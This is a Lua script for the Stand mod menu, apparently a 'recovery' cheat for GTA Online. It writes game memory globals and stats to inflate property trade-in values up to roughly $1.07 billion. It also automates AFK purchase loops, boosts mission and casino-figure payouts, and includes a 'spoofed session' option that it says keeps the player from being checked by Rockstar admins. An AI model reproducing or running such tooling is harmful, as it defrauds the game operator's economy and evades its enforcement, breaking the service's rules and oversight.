            MOVE_CURSOR(0.78, 0.28) -- nightclub filter
            break
        case 1680:
            MOVE_CURSOR(0.78 - afk_meta.nc.offset, 0.28) -- nightclub filter
            break
        case 1600:
            if y == 1024 then
                MOVE_CURSOR(0.78 - (afk_meta.nc.offset + 0.01), 0.28) -- nightclub filter
            end

            if y == 900 then
                MOVE_CURSOR(0.78, 0.28) -- nightclub filter
            end
            break
        case 1440:
            MOVE_CURSOR(0.78 - afk_meta.nc.offset, 0.28) -- nightclub filter
            break
        case 1366:
            MOVE_CURSOR(0.78, 0.28) -- nightclub filter
            break
        case 1360:
            MOVE_CURSOR(0.78, 0.28) -- nightclub filter
            break
        case 1280: 
            if y == 1024 then
                MOVE_CURSOR(0.78 - (afk_meta.nc.offset * 3), 0.28) -- nightclub filter
            end

            if y == 960 then
                MOVE_CURSOR(0.78 - (afk_meta.nc.offset * 2.5), 0.28) -- nightclub filter
            end

            if y == 800 then
                MOVE_CURSOR(0.78 - afk_meta.nc.offset, 0.28) -- nightclub filter
            end

            if y == 768 then
                MOVE_CURSOR(0.78 - (afk_meta.nc.offset / 2), 0.28) -- nightclub filter
            end

            if y == 720 then
                MOVE_CURSOR(0.78, 0.28) -- nightclub filter
            end
            break
        case 1176:
            MOVE_CURSOR(0.78, 0.28) -- nightclub filter
            break
        case 1152:
            MOVE_CURSOR(0.78 - (afk_meta.nc.offset * 2.5), 0.28) -- nightclub filter
            break
        case 1024:
            MOVE_CURSOR(0.78 - (afk_meta.nc.offset * 2.5), 0.28) -- nightclub filter
            break
        case 800:
            MOVE_CURSOR(0.78 - (afk_meta.nc.offset * 2.5), 0.28) -- nightclub filter
            break
        default: 
            util.toast("Unsupported resolution: " .. x .. "x" .. y)
    end

    SIMULATE_CONTROL_KEY(201, 1) -- select nightclub filter
end

local property_ids = {
    nightclubs = {
        ["La Mesa"] = 1,
        ["Mission Row"] = 2,
        ["Strawberry"] = 3,
        ["West Vinewood"] = 4,
        ["Cypress Flats"] = 5,
        ["LSIA"] = 6,
        ["Elysian Island"] = 7,
        ["Downtown Vinewood"] = 8,
        ["Del Perro"] = 9,
        ["Vespucci Canals"] = 10
    },
    arcades = {
        ["Warehouse - Davis"] = 3,
        ["Eight Bit"] = 4,
        ["Insert Coin - Rockford Hills"] = 5,
        ["La Mesa"] = 6
    },
    autoshops = {
        ["La Mesa"] = 1,
        ["Strawberry"] = 2,
        ["Burton"] = 3,
        ["Rancho"] = 4,
        ["Mission Row"] = 5
    },
    agencies = {
        ["Hawick"] = 1,
        ["Rockford Hills"] = 2,
        ["Little Seoul"] = 3,
        ["Vespucci Canals"] = 4
    },
    hangers = {
        ["LSIA 1"] = 1,
        ["LSIA A17"] = 2,
        ["Fort Zancudo Hangar A2"] = 3,
        ["Fort Zancudo Hangar 3497"] = 4,
        ["Fort Zancudo Hangar 3499"] = 5
    },
    bunkers = {
        
    },
    facilities = {
        ["Grand Senora Desert"] = 1,
        ["Route 68"] = 2,
        ["Sandy Shores"] = 3,
        ["Mount Gordo"] = 4,
        ["Paleto Bay"] = 5,
        ["Fort Zancudo"] = 6,
        ["Ron Alternates Wind Farm"] = 8,
        ["Land Act Reservoir"] = 9
    }
}

local options = {
    "50,000,000", "100,000,000", "150,000,000", "200,000,000",
    "250,000,000", "300,000,000", "350,000,000", "400,000,000",
    "450,000,000", "500,000,000", "550,000,000", "600,000,000",
    "650,000,000", "700,000,000", "750,000,000", "800,000,000", 
    "850,000,000", "900,000,000", "950,000,000","1,000,000,000",
}

local function convert_value(value)
    switch value do
        case "50,000,000": return 50000000 break
        case "100,000,000": return 100000000 break
        case "150,000,000": return 150000000 break
        case "200,000,000": return 200000000 break
        case "250,000,000": return 250000000 break
        case "300,000,000": return 300000000 break
        case "350,000,000": return 350000000 break
        case "400,000,000": return 400000000 break
        case "450,000,000": return 450000000 break
        case "500,000,000": return 500000000 break
        case "550,000,000": return 550000000 break
        case "600,000,000": return 600000000 break
        case "650,000,000": return 650000000 break
        case "700,000,000": return 700000000 break
        case "750,000,000": return 750000000 break
        case "800,000,000": return 800000000 break
        case "850,000,000": return 850000000 break
        case "900,000,000": return 900000000 break
        case "950,000,000": return 950000000 break
        case "1,000,000,000": return 1000000000 break
        case "Maximum": return (2 << 30) - 1 break
        default: return (2 << 30) - 1 break
    end
end

local function is_owned(stat)
    local pOwned = memory.alloc_int()
    if STATS.STAT_GET_INT(stat, pOwned, -1) then
        local prop_id = memory.read_int(pOwned)
        if settings.verbose then util.toast("Stat Value: " .. prop_id) end
        return prop_id > 0
    else
        if settings.verbose then util.toast("Reading stat failed") end
    end

    return false
end

local function tunable(value)
    return memory.script_global(262145 + value)
end

local function get_owned_property(property, as_id)
    local ptr = memory.alloc(4)

    switch property do
        case "Nightclub":
            if STATS.STAT_GET_INT(stats.nightclub_owned, ptr, -1) then
                local prop_id = memory.read_int(ptr)
                if prop_id > 0 then
                    if not as_id then
                        for name, id in pairs(property_ids.nightclubs) do
                            if id == prop_id then
                                return name
                            end
                        end
                    else
                        return prop_id
                    end
                end
            end
            break
        end
end

local function get_property_names(property)
    switch property do
        case "Nightclub":
            local names = {}
            for name, id in pairs(property_ids.nightclubs) do
                table.insert(names, name)
            end
            return names
            break
        case "Arcade": return {} break
        case "Autoshop": return {} break
        case "Agency": return {} break
        case "Hanger": return {} break
        case "Facility": return {} break
        default: return {} break
    end
end

local show_usage = {
    nightclub = os.time(),
    arcade = os.time(),
    autoshop = os.time(),
    agency = os.time(),
    hanger = os.time(),
    facility = os.time(),
}

local globals = {
    nightclub_prices = {
        ["La Mesa"] = tunable(24838),
        ["Mission Row"] = tunable(24843),
        ["Vespucci Canals"] = tunable(24845)
    }
}

local usage_timer = 20

items.settings.root = root:list("Settings", {}, "Settings for the script")
items.presets.root = root:list("Presets", {}, "Preset values for convenience (not all presets will be the exact value", function() util.show_corner_help("If you haven\'t unlocked arcades and autoshops on mazebank foreclosure yet then AFK money loop will not work properly") end)
items.custom.root = root:list("Custom", {}, "Customisable values for fine-tuning to your own liking")

items.settings.root:toggle("Disable Ownership Check", {}, "Disable ownership check for properties (useful if reading the stat is failing)", function(state) settings.ownership_check = state end)
items.settings.root:toggle("Verbose", {}, "Show verbose output", function(state) settings.verbose = state end)
items.presets.root:divider("MazeBank Properties", "MazeBank Properties")
items.presets.nightclub.root = items.presets.root:list("Nightclub", {}, "Preset values for nightclub")
items.presets.arcade.root = items.presets.root:list("Arcade", {}, "Preset values for arcade")
items.presets.autoshop.root = items.presets.root:list("Autoshop", {}, "Preset values for autoshop")
items.presets.hanger.root = items.presets.root:list("Hanger", {}, "Preset values for hanger")
items.presets.facility.root = items.presets.root:list("Facility", {}, "Preset values for facility")
items.presets.root:divider("Dynasty8Executive Properties", "Dynasty8Executive Properties")
items.presets.agency.root = items.presets.root:list("Agency", {}, "Preset values for agency")

items.presets.nightclub.root:divider("Nightclub", "Nightclub")
items.presets.nightclub.choice = items.presets.nightclub.root:list_select("Money", {}, "The nightclub trade-in price", options, 1, function(index) end)
items.presets.nightclub.root:toggle_loop("Enable", {}, "Enable the preset value for your nightclub", function()
    local ref =  menu.ref_by_rel_path(items.presets.nightclub.root, "Enable")
    local value = convert_value(options[items.presets.nightclub.choice.value])

    if settings.ownership_check then
        if not is_owned(stats.nightclub_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own a nightclub")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.nightclub, ((value * 2) + 4500000), true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set nightclub trade-in price")
    end

    if show_usage.nightclub - os.time() <= 0 then
        show_usage.nightclub = os.time() + usage_timer
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new nightclub to get the money")
    end
end)

local nc_owned = get_owned_property("Nightclub", false)
local nc_options = {
    first = {"La Mesa", "Mission Row", "Vespucci Canals"},
    second = {"Vespucci Canals", "Mission Row", "La Mesa"}
}

items.presets.nightclub.root:action("Buy Nightclub", {}, "Automatically purchases a nightclub", function()
    local nc = nc_options.first[math.random(#nc_options.first)]
    local value = convert_value(options[items.presets.nightclub.choice.value])
    local wallet = players.get_wallet(players.user())
    local bank = players.get_bank(players.user())

    while nc == nc_owned do
        nc = nc_options.first[math.random(#nc_options.first)]
    end

    local price = memory.read_int(globals.nightclub_prices[nc])
    
    if wallet ~= nil and bank ~= nil then
        if wallet + bank < price then
            util.toast("[Recovery]: You need $" .. price .. " to purchase " .. nc .. " nightclub")
            return
        end
    end

    value = (value * 2) + price * 2
    if nc == "La Mesa" then value = value - 400000 end

    if not STATS.STAT_SET_INT(stats.nightclub, value, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set nightclub trade-in price")
        return
    end

    while menu.is_open() do
        util.toast("[Recovery]: Close Stand menu to continue")
        util.yield()
    end

    afk_meta:open_internet()
    afk_meta:purchase_nightclub(nc)

    nc_owned = get_owned_property("Nightclub", false)
end)

items.presets.nightclub.root:divider("AFK Money Loop", "AFK Money Loop")
items.presets.nightclub.first_nightclub = items.presets.nightclub.root:list_select("First Nightclub", {}, "First nightclub to purchase", nc_options.first, "1", function(index) end)
items.presets.nightclub.second_nightclub = items.presets.nightclub.root:list_select("Second Nightclub", {}, "Second nightclub to purchase", nc_options.second, "1", function(index) end)
items.presets.nightclub.root:toggle_loop("Modify Value $1.07B", {}, "Modify the value to $1.07B", function()
    STATS.STAT_SET_INT(stats.nightclub, (2 << 30) - 1, true)
end)

items.presets.nightclub.root:toggle_loop("AFK Loop", {}, "AFK money loop", function()
    local afk_loop =  menu.ref_by_rel_path(items.presets.nightclub.root, "AFK Loop")
    local first_nc_name = nc_options.first[tonumber(items.presets.nightclub.first_nightclub.value)]
    local second_nc_name = nc_options.second[tonumber(items.presets.nightclub.second_nightclub.value)]
    local enable =  menu.ref_by_rel_path(items.presets.nightclub.root, "Enable")
    enable.value = false

    if first_nc_name == nc_owned then
        util.show_corner_help("You already own " .. nc_owned .. " choose another nightclub")
        afk_loop.value = false
        return
    end

    if first_nc_name == second_nc_name then
        util.show_corner_help("First and second nightclub cannot be the same, choose another nightclub")
        afk_loop.value = false
        return
    end

    if not afk_loop.value then return end

    afk_meta:open_internet(true)
    afk_meta:purchase_nightclub(first_nc_name)
    util.yield(1000)
    afk_meta:open_internet(true)
    afk_meta:purchase_nightclub(second_nc_name)
    util.yield(1000)
end)

items.presets.nightclub.root:divider("Tools", "Tools")
items.presets.nightclub.root:action("Unlock Arcades On MazeBank", {}, "Unlocks arcades", function()
    local current_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    local lester_blip = HUD.GET_NEXT_BLIP_INFO_ID(77)
    local casino_blip = HUD.GET_NEXT_BLIP_INFO_ID(804)

    if HUD.DOES_BLIP_EXIST(lester_blip) == 0 or HUD.DOES_BLIP_EXIST(casino_blip) == 0 then
        util.toast("[Recovery]: Failed to find blip(s)")
        return
    end

    local lester_coords = HUD.GET_BLIP_COORDS(lester_blip)
    local casino_coords = HUD.GET_BLIP_COORDS(casino_blip)

    ENTITY.SET_ENTITY_COORDS(players.user_ped(), casino_coords.x, casino_coords.y, casino_coords.z, true, true, true, true)
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 51, 1)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), lester_coords.x, lester_coords.y, lester_coords.z, true, true, true, true)
    util.yield(500)
    menu.trigger_commands("skipcutscene")
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), current_pos.x, current_pos.y, current_pos.z, true, true, true, true)

    util.toast("[Recovery]: Unlocked arcades")
end)

items.presets.nightclub.root:action("Unlock Autoshops On MazeBank", {}, "Unlock Autoshops", function()
    local pos = v3.new(778.99708076172, -1867.5257568359, 28.296264648438)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), pos.x, pos.y, pos.z, true, true, true, true)
end)

items.presets.arcade.choice = items.presets.arcade.root:list_select("Money", {}, "The arcade trade-in price", options, 1, function() end)
items.presets.arcade.root:toggle_loop("Enable", {}, "Enable the preset value for your arcade", function()
    local ref =  menu.ref_by_rel_path(items.presets.arcade.root, "Enable")
    local value = convert_value(options[items.presets.arcade.choice.value]) 

    if settings.ownership_check then
        if not is_owned(stats.arcade_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own an arcade")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.arcade, ((value - 255000) * 2) + 4500000, true) then
        menu.ref_by_rel_path(items.presets.arcade.root, "Enable").value = false
        util.toast("[Recovery]: Failed to set arcade trade-in price")
    end

    if show_usage.arcade - os.time() <= 0 then
        show_usage.arcade = os.time() + usage_timer
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new arcade to get the money")
    end
end)

items.presets.autoshop.choice = items.presets.autoshop.root:list_select("Money", {}, "The autoshop trade-in price", options, 1, function() end)
items.presets.autoshop.root:toggle_loop("Enable", {}, "Enable the preset value for your autoshop", function()
    local ref = menu.ref_by_rel_path(items.presets.autoshop.root, "Enable")
    local value = convert_value(options[items.presets.autoshop.choice.value])
    
    if settings.ownership_check then
        if not is_owned(stats.autoshop_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own an autoshop")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.autoshop, (value * 2) + 4500000, true) then
        menu.ref_by_rel_path(items.presets.autoshop.root, "Enable").value = false
        util.toast("[Recovery]: Failed to set autoshop trade-in price")
    end

    if show_usage.autoshop - os.time() <= 0 then
        show_usage.autoshop = os.time() + usage_timer
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new autoshop to get the money")
    end
end)

items.presets.hanger.choice = items.presets.hanger.root:list_select("Money", {}, "The hanger trade-in price", options, 1, function() end)
items.presets.hanger.root:toggle_loop("Enable", {}, "Enable the preset value for your hanger", function()
    local ref = menu.ref_by_rel_path(items.presets.hanger.root, "Enable")
    local value = convert_value(options[items.presets.hanger.choice.value])

    if settings.ownership_check then
        if not is_owned(stats.hanger_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own a hanger")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.hanger, ((value - 645000) * 2) + 4500000, true) then
        menu.ref_by_rel_path(items.presets.hanger.root, "Enable").value = false
        util.toast("[Recovery]: Failed to set hanger trade-in price")
    end

    if show_usage.hanger - os.time() <= 0 then
        show_usage.hanger = os.time() + usage_timer
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new hanger to get the money")
    end
end)

items.presets.facility.choice = items.presets.facility.root:list_select("Money", {}, "The facility trade-in price", options, 1, function() end)
items.presets.facility.root:toggle_loop("Enable", {}, "Enable the preset value for your facility", function()
    local ref = menu.ref_by_rel_path(items.presets.facility.root, "Enable")
    local value = convert_value(options[items.presets.facility.choice.value])

    if settings.ownership_check then
        if not is_owned(stats.facility_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own a facility")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.facility, (value * 2) + 4500000, true) then
        menu.ref_by_rel_path(items.presets.facility.root, "Enable").value = false
        util.toast("[Recovery]: Failed to set facility trade-in price")
    end

    if show_usage.facility - os.time() <= 0 then
        show_usage.facility = os.time() + usage_timer
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new facility to get the money")
    end
end)

items.presets.agency.choice = items.presets.agency.root:list_select("Money", {}, "The agency trade-in price", options, 1, function() end)
items.presets.agency.root:toggle_loop("Enable", {}, "Enable the preset value for your agency", function()
    local ref = menu.ref_by_rel_path(items.presets.agency.root, "Enable")
    local value = convert_value(options[items.presets.agency.choice.value])
    
    if settings.ownership_check then
        if not is_owned(stats.agency_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own an agency")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.agency, ((value - 897500) * 2) + 4500000, true) then
        menu.ref_by_rel_path(items.presets.agency.root, "Enable").value = false
        util.toast("[Recovery]: Failed to set agency trade-in price")
    end

    if show_usage.agency - os.time() <= 0 then
        show_usage.agency = os.time() + usage_timer
        util.show_corner_help("Goto dynasty8executive website and purchase a new agency to get the money")
    end
end)

items.custom.root:divider("MazeBank Properties", "MazeBank Properties")
items.custom.nightclub.root = items.custom.root:list("Nightclub", {}, "Customisable values for nightclub")
items.custom.arcade.root = items.custom.root:list("Arcade", {}, "Customisable values for arcade")
items.custom.autoshop.root = items.custom.root:list("Autoshop", {}, "Customisable values for autoshop")
items.custom.hanger.root = items.custom.root:list("Hanger", {}, "Customisable values for hanger")
items.custom.facility.root = items.custom.root:list("Facility", {}, "Customisable values for facility")
items.custom.root:divider("Dynasty8Executive Properties", "Dynasty8Executive Properties")
items.custom.agency.root = items.custom.root:list("Agency", {}, "Customisable values for agency")

items.custom.nightclub.root:text_input("Money", {"nightclubvalue"}, "The nightclub trade-in price", function(value) 
    if settings.ownership_check then
        if not is_owned(stats.nightclub_owned) then
            util.toast("[Recovery]: You do not own a nightclub")
            return
        end
    end

    value = tonumber(value)

    if not STATS.STAT_SET_INT(stats.nightclub, (value * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set nightclub trade-in price")
    end

    util.show_corner_help("Goto maze bank foreclosure website and purchase a new nightclub to get the money")
end, "0")

items.custom.nightclub.root:toggle_loop("Enable", {}, "", function()
    local ref = menu.ref_by_rel_path(items.custom.nightclub.root, "Enable")
    local value = tonumber(menu.ref_by_rel_path(items.custom.nightclub.root, "Money").value)
    
    if settings.ownership_check then
        if not is_owned(stats.nightclub_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own a nightclub")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.nightclub, (value * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set nightclub trade-in price")
    end

    if show_usage.nightclub - os.time() <= 0 then
        show_usage.nightclub = os.time() + 15
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new nightclub to get the money")
    end
end)

items.custom.arcade.root:text_input("Money", {"arcadevalue"}, "The arcade trade-in price", function(value) 
    if settings.ownership_check then
        if not is_owned(stats.arcade_owned) then
            util.toast("[Recovery]: You do not own an arcade")
            return
        end
    end

    value = tonumber(value)

    if not STATS.STAT_SET_INT(stats.arcade, ((value - 255000) * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set arcade trade-in price")
    end

    util.show_corner_help("Goto maze bank foreclosure website and purchase a new arcade to get the money")
end, "0")

items.custom.arcade.root:toggle_loop("Enable", {}, "", function()
    local ref = menu.ref_by_rel_path(items.custom.arcade.root, "Enable")
    local value = tonumber(menu.ref_by_rel_path(items.custom.arcade.root, "Money").value)
    
    if settings.ownership_check then
        if not is_owned(stats.arcade_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own an arcade")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.arcade, ((value - 255000) * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set arcade trade-in price")
    end

    if show_usage.arcade - os.time() <= 0 then
        show_usage.arcade = os.time() + 15
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new arcade to get the money")
    end
end)

items.custom.autoshop.root:text_input("Money", {"autoshopvalue"}, "The autoshop trade-in price", function(value) 
    if settings.ownership_check then
        if not is_owned(stats.autoshop_owned) then
            util.toast("[Recovery]: You do not own an autoshop")
            return
        end
    end

    value = tonumber(value)

    if not STATS.STAT_SET_INT(stats.autoshop, (value * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set autoshop trade-in price")
    end

    util.show_corner_help("Goto mazebank foreclosure website and purchase a new autoshop to get the money")
end, "0")

items.custom.autoshop.root:toggle_loop("Enable", {}, "", function()
    local ref = menu.ref_by_rel_path(items.custom.autoshop.root, "Enable")
    local value = tonumber(menu.ref_by_rel_path(items.custom.autoshop.root, "Money").value)
    
    if settings.ownership_check then
        if not is_owned(stats.autoshop_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own an autoshop")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.autoshop, (value * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set autoshop trade-in price")
    end

    if show_usage.autoshop - os.time() <= 0 then
        show_usage.autoshop = os.time() + 15
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new autoshop to get the money")
    end
end)

items.custom.hanger.root:text_input("Money", {"hangervalue"}, "The hanger trade-in price", function(value) 
    if settings.ownership_check then
        if not is_owned(stats.hanger_owned) then
            util.toast("[Recovery]: You do not own a hanger")
            return
        end
    end

    value = tonumber(value)

    if not STATS.STAT_SET_INT(stats.hanger, ((value - 255000) * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set hanger trade-in price")
    end

    util.show_corner_help("Goto mazebank foreclosure website and purchase a new hanger to get the money")
end, "0")

items.custom.hanger.root:toggle_loop("Enable", {}, "", function()
    local ref = menu.ref_by_rel_path(items.custom.hanger.root, "Enable")
    local value = tonumber(menu.ref_by_rel_path(items.custom.hanger.root, "Money").value)
    
    if settings.ownership_check then
        if not is_owned(stats.hanger_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own a hanger")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.hanger, ((value - 255000) * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set hanger trade-in price")
    end

    if show_usage.hanger - os.time() <= 0 then
        show_usage.hanger = os.time() + 15
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new hanger to get the money")
    end
end)

items.custom.facility.root:text_input("Money", {"facilityvalue"}, "The facility trade-in price", function(value) 
    if settings.ownership_check then
        if not is_owned(stats.facility_owned) then
            util.toast("[Recovery]: You do not own a facility")
            return
        end
    end

    value = tonumber(value)

    if not STATS.STAT_SET_INT(stats.facility, (value * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set facility trade-in price")
    end

    util.show_corner_help("Goto mazebank foreclosure website and purchase a new facility to get the money")
end, "0")

items.custom.facility.root:toggle_loop("Enable", {}, "", function()
    local ref = menu.ref_by_rel_path(items.custom.facility.root, "Enable")
    local value = tonumber(menu.ref_by_rel_path(items.custom.facility.root, "Money").value)
    
    if settings.ownership_check then
        if not is_owned(stats.facility_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own a facility")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.facility, (value * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set facility trade-in price")
    end

    if show_usage.facility - os.time() <= 0 then
        show_usage.facility = os.time() + 15
        util.show_corner_help("Goto mazebank foreclosure website and purchase a new facility to get the money")
    end
end)

items.custom.agency.root:text_input("Money", {"agencyvalue"}, "The agency trade-in price", function(value) 
    if settings.ownership_check then
        if not is_owned(stats.agency_owned) then
            util.toast("[Recovery]: You do not own an agency")
            return
        end
    end

    value = tonumber(value)

    if not STATS.STAT_SET_INT(stats.agency, ((value - 645000) * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set agency trade-in price")
    end

    util.show_corner_help("Goto mazebank foreclosure website and purchase a new agency to get the money")
end, "0")

items.custom.agency.root:toggle_loop("Enable", {}, "", function()
    local ref = menu.ref_by_rel_path(items.custom.agency.root, "Enable")
    local value = tonumber(menu.ref_by_rel_path(items.custom.agency.root, "Money").value)
    
    if settings.ownership_check then
        if not is_owned(stats.agency_owned) then
            ref.value = false
            util.toast("[Recovery]: You do not own an agency")
            return
        end
    end

    if not STATS.STAT_SET_INT(stats.agency, ((value - 645000) * 2) + 4500000, true) then
        ref.value = false
        util.toast("[Recovery]: Failed to set agency trade-in price")
    end

    if show_usage.agency - os.time() <= 0 then
        show_usage.agency = os.time() + 15
        util.show_corner_help("Goto dynasty8executive website and purchase a new agency to get the money")
    end
end)

items.dax_mission.root = root:list("Dax Mission", {"daxmission"}, "Make easy money from the dax mission required to unlock the freakshop", function() util.show_corner_help("Check 'enable cash boost' option and start one of the new dax missions (if you haven't completed the first mission the 'Start Mission' will automatically start the first mission for you, the R on the map at sandy shores), once the mission has started you need to kill yourself immediately to fail the mission and you will recieve $1,000,000, take too long to kill yourself during the mission and you won\'t get any money") end)
items.dax_mission.root:divider("Help", "How to use this menu")
items.dax_mission.root:action("How To Use", {}, "", function()
    util.show_corner_help("Check 'enable cash boost' option and start one of the new dax missions (if you haven't completed the first mission the 'Start Mission' will automatically start the first mission for you, the R on the map at sandy shores), once the mission has started you need to kill yourself immediately to fail the mission and you will recieve $1,000,000, take too long to kill yourself during the mission and you won\'t get any money")
end)

items.dax_mission.root:divider("Options", "Recovery options using Dax Mission")
items.dax_mission.root:action("Start Mission", {}, "This will teleport you to the mission trigger and start it (if you've not completed the job already)", function()
    local ped = PLAYER.PLAYER_PED_ID()
    ENTITY.SET_ENTITY_COORDS(ped, 1394.4620361328, 3598.4528808594, 34.990489959717)
    util.yield(200)
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 51, 1)
end)

items.dax_mission.root:toggle_loop("Enable Cash Boost", {}, "", function()
    local cash = tunable(0)
    local ref = menu.ref_by_rel_path(items.dax_mission.root, "Enable RP Boost")
    
    if not ref.value then
        memory.write_float(cash, 5000.0) -- setting this value higher causes you to get no money (1m is the limit)
    end
end)

items.dax_mission.root:toggle_loop("Enable RP Boost", {}, "", function()
    local cash = tunable(0)
    local rp = tunable(1)
    local ref = menu.ref_by_rel_path(items.dax_mission.root, "Enable Cash Boost")
    
    memory.write_float(rp, 2000.0)
    if ref.value then
        memory.write_float(cash, 500.0)
    end
end)

items.casino_figures.root = root:list("Casino Figures", {"casinofigures"}, "Changes the amount of money you recieve from 1 figure to $200,000")
items.casino_figures.root:toggle_loop("Enable", {}, "Drops figures that give you $200,000", function()
    local cash = tunable(27123)

    memory.write_int(cash, 200000)
    menu.trigger_commands("rp" .. players.get_name(players.user()) .. " on")
end, function()
    local cash = tunable(27123)

    memory.write_int(cash, 1000)
    menu.trigger_commands("rp" .. players.get_name(players.user()) .. " off")
end)

items.casino_figures.root:toggle("Disable RP", {}, "Disables RP from casino figures", function(state)
    local rp = tunable(1)

    if state then
        memory.write_float(rp, 0)
    else
        memory.write_float(rp, 1.0)
    end
end)

	cargoloo = menu.list(cashloops, "Cargo Loop (Open MB First)", {}, "", function(); end)

	menu.hyperlink(cargoloo, "How to Use Tutorial", "https://drive.google.com/file/d/1GTggKA5O1Tl2IHvrH-WeV83XoAw26Y-s/view?usp=sharing")

local main_menu = menu.list(cargoloo, "Options", {}, "")

menu.divider(main_menu, "Settings")
opti_settings = menu.toggle(main_menu,'Optimised Settings', {""}, 'Improve FPS and stability of the lua.\nNOTE: Reducing resolution and play on windowed mode also helps a lot.', function()
	if menu.get_value(opti_settings) then
        opti_value = "on"
    else
        opti_value = "off"
    end
    menu.trigger_commands("anticrashcamera "..opti_value)
    menu.trigger_commands("potatomode "..opti_value)
    menu.trigger_commands("nosky "..opti_value)
    menu.trigger_commands("noidlekick "..opti_value)
    menu.trigger_commands("noidlecam "..opti_value)
    menu.trigger_commands("monitorcargo "..opti_value)
    menu.trigger_commands("maxsellcargo "..opti_value)
    menu.trigger_commands("nobuycdcargo "..opti_value)
    menu.trigger_commands("nosellcdcargo "..opti_value)
    menu.trigger_commands("autocompletespecialbuy "..opti_value)
    menu.trigger_commands("autocompletespecialsell "..opti_value)
end)

moneyMultiplier = menu.toggle_loop(main_menu, 'Disable RP', {""}, 'Dont earn anymore RP with cargo sells.', function()
	if menu.get_value(moneyMultiplier) then
        util.draw_debug_text("RP Disabled")
		memory.write_float(memory.script_global(262145 + 1), 0)
	else
		memory.write_float(memory.script_global(262145 + 1), 1)
	end
end)

menu.action(main_menu,'Solo Spoofed Session', {""}, 'Reduces even more risks.\nNOTE: Will make you go in solo session with spoofed session so you cant be crashed or checked by R* Admins.', function()
	    menu.trigger_commands("go solo")
	    menu.trigger_commands("spoofsession storymode")
end)

menu.action(main_menu, "Send To Storymode If Stuck", {"gostorymode"}, "Press if the warehouse screen/scaleform gets stuck. It will forcequit you to SP, but you at least wont have to restart your game.", function()
    menu.trigger_commands("forcequittosp")
end)


-- disable idiot proof if you are an idiot or actually know what you are doing and start MB on its own
local idiot_proof = true

-- change this if you know what you are doing and maybe speak a different language 
local your_fucking_language = "en"

util.ensure_package_is_installed("lua/MusinessBanager")

local function BitTest(address, offset)
    return (memory.read_int(address) & (1 << offset)) ~= 0
end

local function does_path_exist(path)
    return menu.ref_by_path(path):isValid()
end

local function wait_until_path_is_available(path, message)
    while true do
        if not does_path_exist(path) then
            if not SCRIPT_SILENT_START then
                util.toast(message)
            end
        else
            break
        end
        util.yield()
    end
end

local function stat_get_int(hash)
    local ptr = memory.alloc_int()
    STATS.STAT_GET_INT(hash, ptr, -1)
    local value = memory.read_int(ptr)
    return value
end

local function kill_appsecuroserv()
    util.spoof_script("appsecuroserv", SCRIPT.TERMINATE_THIS_THREAD)
    PLAYER.SET_PLAYER_CONTROL(players.user(), true, 0)
    PAD.ENABLE_ALL_CONTROL_ACTIONS(0)
    PAD.ENABLE_CONTROL_ACTION(2, 1, true)
    PAD.ENABLE_CONTROL_ACTION(2, 2, true)
    PAD.ENABLE_CONTROL_ACTION(2, 187, true)
    PAD.ENABLE_CONTROL_ACTION(2, 188, true)
    PAD.ENABLE_CONTROL_ACTION(2, 189, true)
    PAD.ENABLE_CONTROL_ACTION(2, 190, true)
    PAD.ENABLE_CONTROL_ACTION(2, 199, true)
    PAD.ENABLE_CONTROL_ACTION(2, 200, true)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
end

local main_mb_path = "Stand>Lua Scripts>MusinessBanager"
local relative_paths = {
    lang =                      ">Language",
    special_cargo =             ">Special Cargo",
    selected_whouse =           ">Special Cargo>Warehouse",
    teleport_to_whouse =        ">Special Cargo>Teleport to Warehouse",
